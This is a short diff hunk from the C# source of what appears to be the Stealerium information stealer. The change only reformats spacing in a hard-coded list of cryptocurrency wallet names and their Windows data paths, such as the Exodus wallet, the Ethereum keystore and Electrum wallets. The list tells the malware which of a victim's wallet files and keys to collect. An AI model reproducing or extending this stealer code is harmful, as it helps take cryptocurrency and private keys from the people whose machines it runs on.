@@ -11,16 +11,16 @@ namespace Stealerium.Target
         // Wallets list directories
         private static readonly List<string[]> SWalletsDirectories = new List<string[]>
         {
-            new[] {"Zcash", Paths.Appdata + "\\Zcash"},
-            new[] {"Armory", Paths.Appdata + "\\Armory"},
-            new[] {"Bytecoin", Paths.Appdata + "\\bytecoin"},
-            new[] {"Jaxx", Paths.Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"},
-            new[] {"Exodus", Paths.Appdata + "\\Exodus\\exodus.wallet"},
-            new[] {"Ethereum", Paths.Appdata + "\\Ethereum\\keystore"},
-            new[] {"Electrum", Paths.Appdata + "\\Electrum\\wallets"},
-            new[] {"AtomicWallet", Paths.Appdata + "\\atomic\\Local Storage\\leveldb"},
-            new[] {"Guarda", Paths.Appdata + "\\Guarda\\Local Storage\\leveldb"},
-            new[] {"Coinomi", Paths.Lappdata + "\\Coinomi\\Coinomi\\wallets"}
+            new[] { "Zcash", Paths.Appdata + "\\Zcash" },
+            new[] { "Armory", Paths.Appdata + "\\Armory" },
+            new[] { "Bytecoin", Paths.Appdata + "\\bytecoin" },
+            new[] { "Jaxx", Paths.Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb" },
+            new[] { "Exodus", Paths.Appdata + "\\Exodus\\exodus.wallet" },
+            new[] { "Ethereum", Paths.Appdata + "\\Ethereum\\keystore" },
+            new[] { "Electrum", Paths.Appdata + "\\Electrum\\wallets" },
+            new[] { "AtomicWallet", Paths.Appdata + "\\atomic\\Local Storage\\leveldb" },
+            new[] { "Guarda", Paths.Appdata + "\\Guarda\\Local Storage\\leveldb" },
+            new[] { "Coinomi", Paths.Lappdata + "\\Coinomi\\Coinomi\\wallets" }
         };
 
         // Wallets list from registry
